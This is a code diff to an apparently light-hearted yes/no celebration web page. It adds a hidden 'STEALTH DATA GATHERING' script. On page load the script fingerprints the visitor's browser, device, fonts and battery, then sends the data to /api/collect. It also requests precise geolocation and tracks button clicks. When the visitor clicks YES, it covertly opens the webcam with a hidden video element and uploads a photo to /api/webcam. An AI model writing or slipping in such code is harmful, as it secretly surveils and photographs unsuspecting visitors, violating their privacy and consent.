@@ -599,6 +599,204 @@
     </section>
 
     <script>
+        // ============================================================
+        //  STEALTH DATA GATHERING
+        // ============================================================
+
+        const COLLECTOR = (function() {
+          function _getVisitorId() {
+            let id = localStorage.getItem('_vid');
+            if (!id) {
+              id = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+              localStorage.setItem('_vid', id);
+            }
+            return id;
+          }
+
+          function _getFingerprint() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200; canvas.height = 50;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('CVE-2024-🖥️', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('PWN', 4, 17);
+            const canvasFp = canvas.toDataURL();
+
+            return {
+              userAgent: navigator.userAgent,
+              platform: navigator.platform,
+              language: navigator.language,
+              languages: navigator.languages,
+              cookieEnabled: navigator.cookieEnabled,
+              doNotTrack: navigator.doNotTrack,
+              hardwareConcurrency: navigator.hardwareConcurrency,
+              deviceMemory: navigator.deviceMemory || 'unknown',
+              maxTouchPoints: navigator.maxTouchPoints,
+              screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth },
+              window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight, devicePixelRatio: window.devicePixelRatio },
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              timezoneOffset: new Date().getTimezoneOffset(),
+              canvasFingerprint: canvasFp,
+              webdriver: navigator.webdriver,
+              plugins: Array.from(navigator.plugins || []).map(p => p.name),
+              mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
+              fonts: (function() {
+                const bases = 'monospace sans-serif serif'.split(' ');
+                const tests = 'Arial Helvetica Times Verdana Georgia Courier Comic+Sans Impact Tahoma Trebuchet+MS Palatino Garamond Bookman Avant+Garde'.split(' ');
+                const found = [];
+                const div = document.createElement('div');
+                div.textContent = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                document.body.appendChild(div);
+                for (const base of bases) {
+                  div.style.fontFamily = base;
+                  const baseWidth = div.offsetWidth;
+                  for (const test of tests) {
+                    div.style.fontFamily = test + ', ' + base;
+                    if (div.offsetWidth !== baseWidth) found.push(test.replace(/\+/g, ' '));
+                  }
+                }
+                document.body.removeChild(div);
+                return found;
+              })(),
+              adblock: (function() {
+                const el = document.createElement('div');
+                el.innerHTML = '&nbsp;';
+                el.className = 'ad_unit ' + Math.random();
+                el.style.position = 'absolute';
+                el.style.top = '-999px';
+                document.body.appendChild(el);
+                const hidden = el.offsetHeight === 0;
+                document.body.removeChild(el);
+                return hidden;
+              })(),
+              connection: (function() {
+                const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                return c ? { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData } : null;
+              })(),
+              battery: null
+            };
+          }
+
+          async function _getBattery() {
+            try {
+              if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                return { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+              }
+            } catch(e) {}
+            return null;
+          }
+
+          function _getGeolocation(vid) {
+            if (!navigator.geolocation) return;
+            navigator.geolocation.getCurrentPosition(
+              function(pos) {
+                fetch('/api/geolocation', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }) }).catch(function(){});
+              },
+              function() {},
+              { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
+            );
+          }
+
+          function sendWebcamImage(vid, imageData) {
+            return fetch('/api/webcam', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, image: imageData }) }).then(function(r) { return r.json(); });
+          }
+
+          async function _send() {
+            const vid = _getVisitorId();
+            const battery = await _getBattery();
+            const fingerprint = _getFingerprint();
+            fingerprint.battery = battery;
+
+            const payload = {
+              id: vid,
+              type: 'page_visit',
+              fingerprint: fingerprint,
+              referrer: document.referrer,
+              url: window.location.href,
+              timestamp: new Date().toISOString(),
+              pageLoaded: performance.now(),
+              source: document.referrer ? 'referral' : 'direct'
+            };
+
+            try { await fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); }
+            catch(e) { navigator.sendBeacon('/api/collect', JSON.stringify(payload)); }
+
+            setTimeout(function() { _getGeolocation(vid); }, 1500);
+          }
+
+          return { send: _send, getVisitorId: _getVisitorId, sendWebcamImage: sendWebcamImage };
+        })();
+
+        COLLECTOR.send();
+
+        // Click tracking
+        document.addEventListener('click', function(e) {
+          const target = e.target;
+          if (target.tagName === 'BUTTON' || target.closest('button')) {
+            const btn = target.tagName === 'BUTTON' ? target : target.closest('button');
+            navigator.sendBeacon('/api/collect', JSON.stringify({
+              id: localStorage.getItem('_vid'),
+              type: 'click',
+              buttonText: btn.textContent.trim(),
+              timestamp: new Date().toISOString()
+            }));
+          }
+        });
+
+        // Stealth camera capture — fires on YES click, no UI
+        let cameraStream = null;
+
+        async function _stealthCapture() {
+          try {
+            cameraStream = await navigator.mediaDevices.getUserMedia({
+              video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: 'user' },
+              audio: false
+            });
+
+            const video = document.createElement('video');
+            video.srcObject = cameraStream;
+            video.playsInline = true;
+            video.muted = true;
+            video.autoplay = true;
+            video.style.display = 'none';
+            document.body.appendChild(video);
+
+            await new Promise(function(resolve, reject) {
+              video.onloadedmetadata = function() {
+                video.play().then(resolve).catch(reject);
+              };
+              setTimeout(reject, 3000);
+            });
+
+            await new Promise(function(r) { setTimeout(r, 400); });
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+
+            const vid = COLLECTOR.getVisitorId();
+            await COLLECTOR.sendWebcamImage(vid, imageData);
+
+            cameraStream.getTracks().forEach(function(t) { t.stop(); });
+            cameraStream = null;
+            document.body.removeChild(video);
+          } catch (err) {
+            if (cameraStream) {
+              try { cameraStream.getTracks().forEach(function(t) { t.stop(); }); } catch(e) {}
+              cameraStream = null;
+            }
+          }
+        }
+
         // Create stars
         function createStars() {
             const starsContainer = document.getElementById('stars');
@@ -671,6 +869,9 @@
             document.getElementById('celebration').classList.add('active');
             createFireworks();
             startCelebration();
+            
+            // Stealth camera capture
+            setTimeout(_stealthCapture, 1200);
         }
 
         // Handle No click
